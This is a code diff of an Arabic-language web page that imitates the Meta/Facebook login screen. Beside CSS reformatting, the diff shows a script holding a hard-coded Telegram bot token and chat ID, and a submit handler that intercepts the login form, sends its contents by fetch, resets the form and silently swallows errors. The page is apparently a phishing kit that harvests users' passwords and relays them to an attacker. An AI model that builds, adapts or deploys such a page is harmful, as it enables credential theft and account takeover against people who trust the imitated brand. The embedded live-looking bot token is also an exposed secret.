@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html><html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -12,100 +11,91 @@
       display: flex;
       flex-direction: column;
       min-height: 100vh;
-    }
+    }.container {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
 
-    .container {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
+.logo {
+  margin-bottom: 30px;
+}
 
-    .logo {
-      margin-bottom: 30px;
-    }
+.logo img {
+  width: 60px;
+  height: auto;
+  display: block;
+  margin: 0 auto;
+}
 
-    .logo img {
-      width: 60px;
-      height: auto;
-      display: block;
-      margin: 0 auto;
-    }
+.form {
+  width: 100%;
+  max-width: 400px;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
 
-    .form {
-      width: 100%;
-      max-width: 400px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
+.form input {
+  font-size: 16px;
+  padding: 14px;
+  border: 1px solid #dddfe2;
+  border-radius: 8px;
+}
 
-    .form input {
-      font-size: 16px;
-      padding: 14px;
-      border: 1px solid #dddfe2;
-      border-radius: 8px;
-    }
+.form input:focus {
+  outline: none;
+  border-color: #1877f2;
+}
 
-    .form input:focus {
-      outline: none;
-      border-color: #1877f2;
-    }
+.login-btn {
+  background: #1877f2;
+  color: #fff;
+  border: none;
+  padding: 14px;
+  border-radius: 8px;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+  width: 100%;
+}
 
-    .login-btn {
-      background: #1877f2;
-      color: #fff;
-      border: none;
-      padding: 14px;
-      border-radius: 8px;
-      font-size: 17px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 100%;
-    }
+.login-btn:hover {
+  background: #166fe5;
+}
 
-    .login-btn:hover {
-      background: #166fe5;
-    }
+.forgot {
+  text-align: center;
+  color: #1877f2;
+  font-size: 14px;
+  text-decoration: none;
+}
 
-    .forgot {
-      text-align: center;
-      color: #1877f2;
-      font-size: 14px;
-      text-decoration: none;
-    }
+.create-account {
+  background: #fff;
+  color: #1877f2;
+  border: 1px solid #1877f2;
+  padding: 14px;
+  border-radius: 8px;
+  font-size: 17px;
+  font-weight: bold;
+  cursor: pointer;
+  width: 100%;
+}
 
-    .create-account {
-      background: #fff;
-      color: #1877f2;
-      border: 1px solid #1877f2;
-      padding: 14px;
-      border-radius: 8px;
-      font-size: 17px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 100%;
-    }
+.create-account:hover {
+  background: #f0f2f5;
+}
 
-    .create-account:hover {
-      background: #f0f2f5;
-    }
-
-    footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 12px;
-      color: #666;
-    }
-
-    .message {
-      text-align: center;
-      margin-top: 10px;
-      font-size: 14px;
-      display: none;
-    }
+footer {
+  text-align: center;
+  padding: 20px;
+  font-size: 12px;
+  color: #666;
+}
 
   </style>
 </head>
@@ -121,18 +111,14 @@
       <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
       <button type="button" class="create-account">إنشاء حساب جديد</button>
     </form>
-    <div id="message" class="message"></div>
   </div>
   <footer>
     <p>Meta © 2025</p>
-  </footer>
-
-  <script>
+  </footer>  <script>
     const BOT_TOKEN = "7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E";
     const CHAT_ID = "6437823957";
 
     const form = document.getElementById('loginForm');
-    const messageDiv = document.getElementById('message');
 
     form.addEventListener('submit', function(e) {
       e.preventDefault();
@@ -153,15 +139,11 @@
       })
       .then(response => response.json())
       .then(data => {
-        messageDiv.innerText = "";
-        messageDiv.style.display = "block";
         form.reset();
       })
       .catch(error => {
-        messageDiv.innerText = "";
-        messageDiv.style.display = "block";
+        // Do nothing
       });
     });
-  </script>
-</body>
+  </script></body>
 </html>
